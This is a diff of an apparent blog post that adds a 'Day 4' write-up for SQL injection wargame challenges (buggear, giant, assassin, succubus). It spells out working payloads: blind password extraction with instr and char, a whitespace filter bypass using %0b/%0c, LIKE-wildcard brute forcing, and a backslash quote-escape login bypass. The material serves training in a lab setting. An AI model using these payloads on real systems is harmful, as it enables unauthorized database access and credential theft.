@@ -53,7 +53,7 @@ id=&#39;or(1)--&#43;- # ... where id=&#39;&#39; or(1)-- &#43;-and pw= id=1&#39; 
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          5 min read
+          7 min read
         </div>
       </div>
     </header>
@@ -231,12 +231,83 @@ req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</
             print(pw)
             <span style="color:#66d9ef">break</span>
 </code></pre></div><h3 id="darkknight">darkknight</h3>
-<p>Use <a href="#golem">golem</a> payload.
+<p>Use <a href="#golem">golem</a> idea.
 i replace <code>''</code> by <code>char()</code> , <code>substring()</code> by <code>left()</code>.</p>
 <p>Many ways, huh!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(id <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">like</span> char(<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">98</span>,<span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">48</span>,<span style="color:#ae81ff">101</span>,<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">49</span>,<span style="color:#ae81ff">102</span>))
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   <span style="color:#f92672">=&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>b70ea1f
-</code></pre></div>
+</code></pre></div><hr>
+<h2 id="day-4">Day 4</h2>
+<ul>
+<li>buggear</li>
+<li>giant</li>
+<li>assassin</li>
+<li>succubus</li>
+</ul>
+<h3 id="buggear">buggear</h3>
+<p>Some filter is added.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    substr,ascii,<span style="color:#f92672">=</span>,<span style="color:#66d9ef">or</span>,<span style="color:#66d9ef">and</span>, ,<span style="color:#66d9ef">like</span>,<span style="color:#ae81ff">0</span>x
+</code></pre></div><p>I search gg and find a function <code>instr</code>.
+This function has 2 parameters <code>instr(a,b)</code> and return <code>Match Position</code></p>
+<p>if <code>b</code> not in <code>a</code>, it&rsquo;ll return 0, else return &gt; 0</p>
+<ul>
+<li>Part 1: combine <code>instr</code> + <code>char</code> we can <code>select id='admin'</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id) <span style="color:#75715e">-- return 1
+</span></code></pre></div><ul>
+<li>Part 2: combine <code>left</code> + <code>char</code> + <code>instr</code> to brute password</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char([<span style="color:#ae81ff">48</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">57</span><span style="color:#f92672">|</span><span style="color:#ae81ff">97</span><span style="color:#f92672">-&gt;</span><span style="color:#ae81ff">122</span>]))
+</code></pre></div><ul>
+<li>Part 3: craft payload:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">1</span>),char(<span style="color:#ae81ff">53</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+<span style="color:#f92672">?</span><span style="color:#66d9ef">no</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">||</span>(instr(char(<span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">109</span>,<span style="color:#ae81ff">105</span>,<span style="color:#ae81ff">110</span>),id)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&amp;&amp;</span>instr(<span style="color:#66d9ef">left</span>(pw,<span style="color:#ae81ff">2</span>),char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>))<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)
+...
+<span style="color:#66d9ef">select</span> char(<span style="color:#ae81ff">53</span>,<span style="color:#ae81ff">50</span>,<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">99</span>,<span style="color:#ae81ff">51</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">57</span>,<span style="color:#ae81ff">49</span>)
+<span style="color:#f92672">==&gt;</span> pw <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span>dc3991
+</code></pre></div><h3 id="giant">giant</h3>
+<p>The task we must complete is split <code>fromprob_giant</code> to <code>from prob_giant</code>.</p>
+<p>The length of <code>shit</code> is 1, so we can&rsquo;t use <code>/**/</code>.</p>
+<p>I wonder why author filter <code>\n</code>,<code>\r</code>,<code>\t</code>.</p>
+<p>So I brute force <code>shit</code> param like this:</p>
+<pre tabindex="0"><code>    shit=%0[a-z0-9]
+</code></pre><p>Gotta, we can use <code>%0b</code> and <code>%0c</code> to bypass this filters.</p>
+<h3 id="assassin">assassin</h3>
+<p>It only filter <code>'</code> and pw param is in quote.</p>
+<p>So we can&rsquo;t use condition here, but wait it use <code>like</code>.</p>
+<p>First, we need to find out about <code>like</code></p>
+<pre tabindex="0"><code>There are two wildcards often used in conjunction with the LIKE operator:
+
+The percent sign (%) represents zero, one, or multiple characters
+The underscore sign (_) represents one, single character
+</code></pre><p>Now, let go to brute force</p>
+<pre tabindex="0"><code>-- query % -&gt; guest
+-- query 9% -&gt; guest
+-- query 90% -&gt; still guest
+-- query 902% -&gt; still guest
+-- query 902e% -&gt; admin
+-- Try with underscore
+-- query ________ -&gt; guest
+-- query 9_______ -&gt; guest
+-- query 90______ -&gt; guest
+-- query 902_____ -&gt; guest
+-- query 902e____ -&gt; admin
+</code></pre><p>From here, we can see <code>pw</code> of admin and guest have some similarities.</p>
+<h3 id="succubus">Succubus</h3>
+<p>The challenge is not hard, if you notice 2 param <code>id</code>,<code>pw</code>, you&rsquo;ll found solution.</p>
+<p>Review the code below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">id</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>); <span style="color:#75715e">// filter &#39;
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\&#39;/&#39;</span>,$_GET[<span style="color:#a6e22e">pw</span>])) <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;HeHe&#34;</span>);
+  $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select id from prob_succubus where id=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">id</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and pw=&#39;</span><span style="color:#e6db74">{</span>$_GET[<span style="color:#a6e22e">pw</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>; 
+  <span style="color:#66d9ef">if</span>($result[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#a6e22e">solve</span>(<span style="color:#e6db74">&#34;succubus&#34;</span>);  <span style="color:#75715e">// anything return from $query
+</span></code></pre></div><p>Obviously, we can&rsquo;t use any condition command trick. Instead of, sign <code>\</code> is the best choice.</p>
+<p>The payload will be look like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    Payload : id<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&amp;</span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">or</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">-- -
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">Explain</span>:
+        <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_succubus <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)-- -&#39;</span>
+        <span style="color:#75715e">-- id=&#39;\&#39; and pw=&#39;,thus $_GET[pw] will be escaped
+</span></code></pre></div>
     </div>
     <div class="post-footer">
       
